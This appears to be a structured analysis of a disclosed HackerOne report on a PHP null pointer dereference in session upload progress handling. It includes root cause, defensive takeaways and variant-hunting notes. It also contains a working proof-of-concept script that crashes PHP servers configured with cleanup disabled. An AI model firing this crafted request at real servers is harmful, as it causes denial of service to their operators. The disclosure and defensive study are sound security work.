# Null Pointer Dereference in PHP Session Upload Progress

## Metadata
- **Source:** HackerOne
- **Report:** 798744 | https://hackerone.com/reports/798744
- **Submitted:** 2020-02-18
- **Reporter:** ryat
- **Program:** PHP
- **Bounty:** not specified
- **Severity:** high
- **Vuln:** null pointer dereference, use after free, denial of service
- **CVEs:** None
- **Category:** uncategorised

## Summary
A null pointer dereference vulnerability exists in PHP's session upload progress handler when session.upload_progress.cleanup is disabled. An attacker can craft a malicious multipart form request that skips the MULTIPART_EVENT_FILE_START event, causing uninitialized memory to be dereferenced in MULTIPART_EVENT_END, resulting in remote DoS.

## Attack scenario
1. Attacker identifies target PHP server running PHP 5.4+ with session.upload_progress.cleanup=0 in php.ini
2. Attacker crafts a multipart form POST request with minimal body that triggers MULTIPART_EVENT_START event
3. Attacker's request intentionally skips any file upload fields, preventing MULTIPART_EVENT_FILE_START from being called
4. Request reaches MULTIPART_EVENT_END handler where progress->data remains uninitialized (all zeros)
5. Handler calls SEPARATE_ARRAY() on uninitialized zval, attempting to dereference null pointer
6. PHP process crashes, causing denial of service

## Root cause
In session.c, the progress->data zval is only initialized when MULTIPART_EVENT_FILE_START is triggered. If a multipart request completes without any file fields, progress->data remains uninitialized (zeros). The MULTIPART_EVENT_END handler unconditionally calls SEPARATE_ARRAY(&progress->data) and add_assoc_bool_ex() on the uninitialized pointer when session.upload_progress.cleanup is disabled, causing null pointer dereference.

## Attacker mindset
Attacker seeks simple remote DoS without requiring server-side PHP code execution. The vulnerability is trivial to exploit requiring only crafted HTTP request with minimal prerequisites. Attacker notices the cleanup flag as a bypass for normal cleanup logic and exploits the code path difference.

## Defensive takeaways
- Always initialize all struct members to safe default values, not relying on calloc zeros
- Validate object state before dereferencing pointers; use sentinel values or type flags
- Guard all pointer dereferences with null checks or state verification
- Avoid code paths with different initialization requirements based on configuration flags
- Test all permutations of multipart event sequences, including edge cases with missing events
- Consider defensive coding patterns: initialize zval types explicitly before use
- Review all conditional initialization logic for gaps where uninitialized memory could be used

## Variant hunting
Search for other multipart event handlers with state-dependent initialization
Look for conditional initialization based on INI settings that could create unguarded code paths
Audit other zval/array operations that depend on prior initialization in different event handlers
Review session.upload_progress feature for similar state machine bugs
Check for other structures allocated with ecalloc() but conditionally initialized
Hunt for SEPARATE_ARRAY() calls on potentially uninitialized zvals throughout codebase

## MITRE ATT&CK
- T1190
- T1499

## Notes
This is a classic state machine vulnerability where code assumes a certain event sequence. The bug requires session.upload_progress.cleanup=0, making it a configuration-dependent vulnerability. PoC is weaponizable against any PHP installation with vulnerable config. No special authentication or valid session required. Affects all 5.4+ versions indicating long-standing code path issue.

## Full report
<details><summary>Expand</summary>

Affected Versions
------------
Affected is all of PHP5.4/5.5/5.6
Affected is all of PHP7

Credits
------------
This vulnerability was disclosed by Taoguang Chen.

Description
------------
session.c
```
static int php_session_rfc1867_callback(unsigned int event, void *event_data, void **extra) /* {{{ */
{
	...
	switch(event) {
		case MULTIPART_EVENT_START: {
			multipart_event_start *data = (multipart_event_start *) event_data;
			progress = ecalloc(1, sizeof(php_session_rfc1867_progress));  <=== the progress was allocated and initialized with zeros.
			progress->content_length = data->content_length;
			progress->sname_len  = strlen(PS(session_name));
			PS(rfc1867_progress) = progress;
		}
		break;
		case MULTIPART_EVENT_FILE_START: {
			...
			if (Z_ISUNDEF(progress->data)) {
                ...
				array_init(&progress->data); <=== if goto MULTIPART_EVENT_FILE_START, &progress->data will be initialized with array-type ZVAL.
				...
			}
            ...
        }
        break;
		...
		case MULTIPART_EVENT_END: {
			multipart_event_end *data = (multipart_event_end *) event_data;

			if (Z_TYPE(progress->sid) && progress->key.s) {
				if (PS(rfc1867_cleanup)) {
					php_session_rfc1867_cleanup(progress);
				} else {
					SEPARATE_ARRAY(&progress->data); <=== if skip MULTIPART_EVENT_FILE_START, the &progress->data will be uninitialized, and still zeros.
					add_assoc_bool_ex(&progress->data, "done", sizeof("done") - 1, 1);
					Z_LVAL_P(progress->post_bytes_processed) = data->post_bytes_processed;
					php_session_rfc1867_update(progress, 1);
				}
				php_rshutdown_session_globals();
			}
```

When the session.upload_progress.cleanup INI option is disabled in php.ini with files upload fails, PHP will wrongly handles the upload progress data, then will be able to lead to use of null pointer. So attackers can exploit the issue to crash PHP remotely and don't need for any special PHP script code on the web server side.

Proof of Concept Exploit
------------

The issue can be easily triggered when session.upload_progress.cleanup=0 in php.ini. For exmaple PHP built-in web server.

/www/web/index.php
```
<?php
//do whatever
?>
```

Running PHP built-in web server.
```
$php -S localhost:8000 -t /www/web/ -d session.upload_progress.cleanup=0
```

poc.php
```
<?php

$host = 'localhost';
$port = '8000';
$addr = '/index.php';

$type = 'multipart/form-data; boundary=---------------------------2020';
$data = <<<EOF
-----------------------------2020
Content-Disposition: form-data; name="PHPSESSID"

session-upload
-----------------------------2020
Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"

ryat
-----------------------------2020--
EOF;

$message = "POST $addr  HTTP/1.1\r\n";
$message .= "Content-Type: $type\r\n";
$message .= "Host: $host\r\n";
$message .= "Content-Length: ".strlen($data)."\r\n";
$message .= "Connection: Close\r\n\r\n";
$message .= $data;

$fp = fsockopen($host, $port);
fputs($fp, $message);

$resp = '';
while ($fp && !feof($fp)) {
    $resp .= fread($fp, 1024);
}
var_dump($resp);

?>
```

Then executing the poc.php will trigger the issue, and crash the PHP built-in web server remotely.
```
$php poc.php
```

This poc.php can also be used to attack a production web environments with session.upload_progress.cleanup=0 in php.ini :-)

## Impact

The issue can be triggered as of PHP 5.4 with the session.upload_progress.cleanup INI option is disabled, and don't need for any special PHP code on the server side. Attackers can exploit the issue to crash PHP remotely.

</details>

---
*Analysed by Claude on 2026-05-24*
